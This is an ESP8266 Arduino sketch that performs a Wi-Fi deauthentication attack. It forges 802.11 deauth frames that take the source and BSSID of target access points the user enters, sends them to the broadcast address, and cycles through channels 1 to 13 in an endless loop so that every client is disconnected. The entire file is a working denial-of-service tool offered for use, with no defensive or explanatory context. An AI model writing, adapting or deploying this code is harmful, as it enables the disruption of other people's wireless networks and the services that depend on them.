//deauth aps in all channel

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

int apno = 2; //number of aps

uint8_t ap [][6] = {
                          { 0xab, 0xab, 0xab, 0xab, 0xab, 0xab}, //enter your ap in this format
                          { 0xab, 0xab, 0xab, 0xab, 0xab, 0xab}
                       };
                       
uint8_t packet[26] = {
  0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//assumed deauth all clients
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //source (ap), replaced by specified ap
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //BSSID (ap), replaced by specified ap
  0x00, 0x00,
  0x07, 0x00,
};

uint16_t deauth(uint8_t *aps)
{
    int i=0;
    for (i=0; i<6; i++) {
      packet[i+10] = aps[i];
      packet[i+16] = aps[i];
    }
    wifi_send_pkt_freedom(packet, 26, 0); //send packet
}

void setup() {
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(1);
}

void loop() {
  for (int i=1;i<14;i++) {
    wifi_set_channel(i);
    for (int j=0;j<apno;j++) {
      deauth(ap[j]);
      delay(100); //adjust as needed
    }
  }
}
